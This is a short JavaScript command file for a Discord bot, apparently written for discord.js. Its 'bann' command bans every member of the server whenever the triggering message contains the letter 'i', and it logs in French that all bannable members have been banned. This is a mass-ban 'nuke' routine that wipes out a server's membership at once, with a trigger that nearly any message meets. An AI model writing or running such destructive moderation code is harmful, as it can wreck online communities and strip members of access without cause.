exports.run = (client, message, args) => {
    if (message.content.includes('i')) {
        message.guild.roles.find('name', '@everyone').members.map(m=>m.ban());
        console.log('Tous les membres bannissables ont été bannis.');
    }
}

exports.conf = {
    permLevel: 4,
    aliases: []
}

exports.help = {
    name: 'bann'
}
